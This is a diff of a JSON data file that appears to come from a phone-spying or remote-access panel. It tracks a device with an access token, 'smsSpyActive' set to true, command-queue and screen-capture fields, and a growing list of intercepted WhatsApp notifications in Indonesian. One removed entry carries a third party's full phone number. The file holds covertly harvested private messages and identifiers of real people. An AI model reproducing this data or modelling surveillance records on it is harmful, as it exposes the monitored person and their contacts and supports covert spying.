@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776954437876,
+    "lastSeen": 1776954450187,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Oi: Bot Gc",
+        "content": "📷 Halo @⁨Nakan⁩, selamat datang di Oi, Kamu Member ke 5",
+        "time": "23/04 22:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776954450580
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎71 pesan dari 41 chat",
+        "time": "23/04 22:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776954450562
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 20:02",
         "pkg": "com.whatsapp",
         "receivedAt": 1776945761919
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 858-3608-9495",
-        "content": "Ya jadi bot",
-        "time": "23/04 20:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776945761680
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎65 pesan dari 42 chat",
-        "time": "23/04 19:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776945547640
       }
     ],
     "galleryPhotos": [],
